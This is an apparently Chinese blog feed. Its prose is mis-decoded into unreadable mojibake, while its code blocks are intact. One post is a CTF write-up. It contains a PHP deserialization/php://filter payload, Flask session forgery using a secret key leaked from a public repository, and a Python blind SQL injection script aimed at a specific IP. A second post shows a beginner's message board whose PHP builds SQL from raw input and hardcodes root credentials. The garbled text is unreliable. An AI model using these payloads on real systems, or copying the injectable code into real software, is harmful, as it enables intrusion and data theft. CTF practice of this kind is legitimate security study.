class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>æºç æ¥çœ‹è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜<br>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ç„¶åä¼ è¿›å»è¯»å–flagï¼Œå› ä¸ºä»–è¿‡æ»¤äº†flagä¸èƒ½ç›´æ¥è¯»å–<br>?user=php://input&amp;file=class.php&amp;pass=O:4:â€Readâ€:1:{s:4:â€fileâ€;s:57:â€php://filter/read=convert.base64-encode/resource=flag.phpâ€;}</p><p>post: admin</p><h2 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h2><p>è€ƒç‚¹ï¼š</p><p>ä¿¡æ¯æ³„éœ²</p><p>flask-sessionä¼ªé€ </p><p>deleteç›²æ³¨</p><p>ç¯å¢ƒï¼š</p><p>python3ç¯å¢ƒ</p><p>flask 1.0.2æ¡†æ¶</p><p>sqlite3æ•°æ®åº“<br>æŸ¥çœ‹æºç <br>æ³¨æ„åˆ°è¿™ä¸ªå›¾ç‰‡åœ°å€<br><a href="https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg</a></p><p>åº”è¯¥æ˜¯æŸä¸ªäººçš„githubåœ°å€<br><a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a><br>å¯ä»¥å‘ç°alipqlè¿™ä¸ªäººçš„githubä»“åº“ï¼š <a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a> åœ¨homeworkè¿™ä¸ªåº“é‡Œé¢çš„homework2ä¸­å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªéç©ºçš„config.pyé…ç½®æ–‡ä»¶</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding=utf<span class="number">-8</span></span><br><span class="line">import <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Config():</span><br><span class="line">    BaseDir = <span class="built_in">os</span>.<span class="built_in">path</span>.abspath(<span class="built_in">os</span>.<span class="built_in">path</span>.dirname(__file__))</span><br><span class="line">    DB_FILE = <span class="built_in">os</span>.<span class="built_in">path</span>.join(BaseDir, <span class="string">'dbfile.sql'</span>)</span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'sqlite:///'</span> + DB_FILE</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = True</span><br><span class="line">    SQLALCHEMY_COMMIT_ON_TEARDOWN = True</span><br><span class="line">    SECRET_KEY = <span class="string">'dropseckey123'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">config</span> = &#123;</span><br><span class="line">    <span class="string">'default'</span>: Config</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»config.pyé…ç½®æ–‡ä»¶ä¸­å¯å¾—åˆ°secert_keyã€sqlæ•°æ®åº“ç±»å‹<br>æ‹¿åˆ°secert_keyåï¼Œåˆ©ç”¨å®ƒè¿›è¡Œflaskçš„sessionä¼ªé€ <br>å·¥å…·åœ°å€:<br><a href="https://github.com/style-404/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/style-404/flask-session-cookie-manager</a><br>é¢˜ç›®ä¸­é¢„åˆ¶çš„æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œtest/test,user/user,å¯é€šè¿‡ç™»å½•ç”¨æˆ·æ—¶è¿”å›çš„sessionéªŒè¯SECRETKEYæ˜¯å¦æ­£ç¡®<br>å¯ä»¥åˆ©ç”¨ï¼Œç„¶åå»ä¼ªé€ adminçš„session<br>æ›¿æ¢æ‰sessionï¼Œå³å¯æˆåŠŸç™»å½•åˆ°adminè´¦æˆ·è·å–ç®¡ç†æƒé™ã€‚</p><p>tip: å­˜åœ¨ä¸€ä¸ªflagè¡¨å’Œflagå­—æ®µ<br>äºæ˜¯è¿›è¡Œ<strong>deleteå¸ƒå°”ç›²æ³¨</strong></p><p>å¯¹æ·»åŠ ç”¨æˆ·åŠŸèƒ½å’Œåˆ é™¤ç”¨æˆ·åŠŸèƒ½ç¨å¾®ä¸€æµ‹è¯•ï¼Œä¼šå‘ç°åˆ é™¤ç”¨æˆ·åŠŸèƒ½æ˜¯å­˜åœ¨æ³¨å…¥çš„ï¼Œæ˜¯deleteçš„æ³¨å…¥ã€‚ä»config.pyçš„ä¿¡æ¯æ³„éœ²ä¸­å¯ä»¥çŸ¥é“æ•°æ®åº“ä¸ºsqliteï¼Œå¯¼è‡´å¾ˆå¤šå‡½æ•°ä¸èƒ½ç”¨ï¼›ç”±äºåˆæ˜¯ä¸ªdeleteæ–¹å¼ï¼Œå¯¼è‡´å¾ˆå¤šå§¿åŠ¿ç”¨ä¸ä¸Šã€‚</p><p>åœ¨è¿™é‡Œè½»å¾®fuzzä¸€ä¸‹å¯å‘ç°åªè¿‡æ»¤äº†dropã€updateã€deleteç­‰éƒ¨åˆ†åˆ è¡¨åˆ flagæ”¹flagçš„å…³é”®å­—ï¼Œè€Œandã€substrã€seleteã€fromã€ç©ºæ ¼ç­‰æœªè¿‡æ»¤ï¼Œå‚æ•°ä¸ºå•å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥å¯ç»„åˆä¸€ä¸ªpayload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <span class="keyword">and</span> substr((<span class="keyword">select</span> flag from flag),<span class="number">1</span>,<span class="number">1</span>)==<span class="symbol">'f</span></span><br></pre></td></tr></table></figure><p>å…ˆå¢åŠ ç”¨æˆ·ï¼Œåœ¨åˆ é™¤ç”¨æˆ·æ—¶æäº¤payloadå†è¿›è¡Œå¸ƒå°”åˆ¤æ–­å³å¯ç›²æ³¨flagã€‚ ä¾‹å¦‚å¢åŠ 111ç”¨æˆ·åå†åˆ é™¤ç”¨æˆ·111</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usernamedel=<span class="number">111</span>' and substr((select flag from flag ),<span class="number">1</span>,<span class="number">1</span>)=='f</span><br><span class="line">æˆåŠŸåˆ é™¤ç”¨æˆ·ï¼Œè¿”å›åŒ…ä¸å­˜åœ¨<span class="number">111</span>ï¼Œè¯´æ˜flagç¬¬ä¸€ä¸ªå­—æ¯ä¸ºfã€‚è‹¥æ”¹ä¸º</span><br><span class="line">usernamedel=<span class="number">111</span>' and substr((select flag from flag),<span class="number">1</span>,<span class="number">1</span>)=='<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºæˆåŠŸåˆ é™¤å´ä¾ç„¶å­˜åœ¨111ç”¨æˆ·ï¼Œæ²¡åˆ é™¤ç”¨æˆ·ï¼Œè¯´æ˜ç¬¬ä¸€ä½ä¸ä¸º0ï¼Œç„¶åæ¥ä¸‹æ¥å†™è„šæœ¬å»è·‘å°±è¡Œäº†</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sqliexp</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.url = <span class="string">'http://172.93.39.218:8888/admin'</span></span><br><span class="line">        <span class="keyword">self</span>.session = <span class="string">'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sIm5hbWUiOiJhZG1pbiJ9.XB-iXg.PURonzshjlDsEvsXYZ24YyuAgI4'</span></span><br><span class="line">        <span class="keyword">self</span>.flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¢åŠ 111ç”¨æˆ·</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">adduser</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span><span class="symbol">:self</span>.session&#125;</span><br><span class="line">        data = &#123;<span class="string">'username'</span><span class="symbol">:<span class="string">'111'</span></span>,<span class="string">'password'</span><span class="symbol">:<span class="string">'111'</span></span>&#125;</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            requests.post(url=<span class="keyword">self</span>.url, cookies=cookies,data=data)</span><br><span class="line">        except <span class="symbol">TimeoutError:</span></span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deluser</span><span class="params">(<span class="keyword">self</span>,num)</span></span><span class="symbol">:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span><span class="symbol">:self</span>.session&#125;</span><br><span class="line">        <span class="keyword">for</span> strs <span class="keyword">in</span> <span class="string">'flag&#123;&#125;0123456789bcde'</span><span class="symbol">:</span></span><br><span class="line">            payload = <span class="string">"111' and substr((select flag from flag),%d,1)=='%s"</span> % (num,strs)</span><br><span class="line">            data = &#123;<span class="string">'usernamedel'</span><span class="symbol">:payload</span>&#125;</span><br><span class="line">            <span class="symbol">try:</span></span><br><span class="line">                response = requests.post(url=<span class="keyword">self</span>.url,data=data,cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'111'</span> <span class="keyword">not</span> <span class="keyword">in</span> response.<span class="symbol">text:</span></span><br><span class="line">                    <span class="keyword">self</span>.flag += strs</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            except <span class="symbol">TimeoutError:</span></span><br><span class="line">                exit(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    exp = sqliexp()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>,<span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">        exp.adduser()</span><br><span class="line">        exp.deluser(num)</span><br><span class="line">        print(exp.flag)</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="ä¸­åŸå·¥å­¦é™¢å›¾ä¹¦é¦†"><a href="#ä¸­åŸå·¥å­¦é™¢å›¾ä¹¦é¦†" class="headerlink" title="ä¸­åŸå·¥å­¦é™¢å›¾ä¹¦é¦†"></a>ä¸­åŸå·¥å­¦é™¢å›¾ä¹¦é¦†</h2><p>çœ‹WPè¯´è¿™é“é¢˜ç‰¹åˆ«ç®€å•,ç”¨binwalkå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‘ç°ä¸€å¼ å›¾ç‰‡ã€‚flagæ­£ç¡®æ ¼å¼æ˜¯drops{}ï¼Œå¯¹å›¾ç‰‡ä¸­çš„å¯†æ–‡è¿›è¡Œrot13è§£å¯†å°±æ‹¿åˆ°flagäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>åˆå†™ç•™è¨€æ¿</title>
      <link href="/2018/12/23/%E5%88%9D%E5%86%99%E7%95%99%E8%A8%80%E6%9D%BF/"/>
      <url>/2018/12/23/%E5%88%9D%E5%86%99%E7%95%99%E8%A8%80%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"><h2 id="ç¬¬ä¸€æ¬¡çš„ç•™è¨€æ¿"><a href="#ç¬¬ä¸€æ¬¡çš„ç•™è¨€æ¿" class="headerlink" title="ç¬¬ä¸€æ¬¡çš„ç•™è¨€æ¿"></a>ç¬¬ä¸€æ¬¡çš„ç•™è¨€æ¿</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€æ¬¡å†™ç•™è¨€æ¿,çœŸçš„å¥½è¾›è‹¦,å‡ åˆ†é’Ÿçœ‹æ‡‚çš„ä»£ç è‡ªå·±ä¸€ä¸ªä¸ªæ•²èŠ±äº†ä¸€ä¸‹åˆ</span><br><span class="line">ä½“ä¼šåˆ°å¼€å‘çš„ç—›è‹¦äº†,å¸Œæœ›è‡ªå·±ä»¥åå¯ä»¥å¤šå†™ä¸œè¥¿å‡ºæ¥</span><br></pre></td></tr></table></figure><h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>ç•™è¨€æ¿<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"list.php"</span>&gt;</span>æµè§ˆç•™è¨€<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"Post"</span> <span class="attr">action</span>=<span class="string">"add.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span>ç”¨æˆ·:<span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">style</span>=<span class="string">"width=350px"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">æ ‡é¢˜:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">å†…å®¹:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"å‘å¸ƒç•™è¨€"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="add-php"><a href="#add-php" class="headerlink" title="add.php"></a>add.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"charset=utf8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span></span><br><span class="line"><span class="php">$user = $_POST[<span class="string">'user'</span>];</span></span><br><span class="line"><span class="php">$title = $_POST[<span class="string">'title'</span>];</span></span><br><span class="line"><span class="php">$content = $_POST[<span class="string">'content'</span>];</span></span><br><span class="line"><span class="php">var_dump($user.$title.$content);</span></span><br><span class="line"><span class="php">$sql = <span class="string">"insert into message (user,title,content) values ('$user','$title','$content')"</span>;</span></span><br><span class="line"><span class="php">$row = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($row)&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('æ’å…¥æˆåŠŸ');window.history.go(-1);&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="conn-php"><a href="#conn-php" class="headerlink" title="conn.php"></a>conn.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">$host = <span class="string">'localhost'</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$conn = mysql_connect($host,$username,$password);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$conn)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">"è¿æ¥å¤±è´¥"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">mysql_select_db(<span class="string">"bbs"</span>,$conn);</span></span><br><span class="line"><span class="php">mysql_query(<span class="string">"set names utf8"</span>);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="del-php"><a href="#del-php" class="headerlink" title="del.php"></a>del.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html,charset='utf-8'"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'list.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span></span><br><span class="line"><span class="php">$id = $_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">$sql = <span class="string">"delete from message where id="</span>.$id;</span></span><br><span class="line"><span class="php">$result = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($result)&#123;</span></span><br><span class="line"><span class="php"> <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('åˆ é™¤æˆåŠŸ');window.location.href='list.php';&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="list-php"><a href="#list-php" class="headerlink" title="list.php"></a>list.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>ç•™è¨€æŸ¥è¯¢<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"add.html"</span>&gt;</span>æ·»åŠ ç•™è¨€<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"50%"</span> <span class="attr">rules</span>=<span class="string">"all"</span> <span class="attr">bgcolor</span>=<span class="string">"#CCFF80"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ç”¨æˆ·<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>æ ‡é¢˜<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>å†…å®¹<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span></span><br><span class="line"><span class="php">$sql = <span class="string">"select * from message order by id desc"</span>;</span></span><br><span class="line"><span class="php">$query = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span 